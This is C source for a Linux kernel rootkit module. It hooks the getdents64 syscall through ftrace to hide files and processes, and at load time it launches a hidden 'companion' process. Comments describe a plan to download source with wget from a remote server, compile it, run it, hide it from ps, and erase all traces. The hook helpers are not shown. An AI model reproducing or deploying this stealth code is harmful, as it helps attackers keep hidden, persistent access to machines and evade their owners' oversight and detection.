#include "hide.h"

int g_pid_companion = -1;

asmlinkage long (*g_original_getdents)(const struct pt_regs *);

static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&g_original_getdents),
}, NULL};

static int __init rootkit_init(void) {
  printk(KERN_INFO "%i\n", current->pid);

  launch_companion();
  get_pid_companion();

  // Protocol:

  // Probably have to run a gcc .c
  // We could host the .c on a github or any server
  // So we would like download the .c, with a wget
  // Then compile it gcc
  // Then launch the companion
  // Then remove all trace

  // So it has to be obfuscate from ps : How do we get the PID ?
  // It's possible to get the pid of a kernelModule with current->pid

  // a mettre dans un fichier pour faire la logic

    printk(KERN_INFO "pid %d\n", g_pid_companion);

    if (fh_install_hook(f_hook[0])) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
    }

    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hook(f_hook[0]);
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");


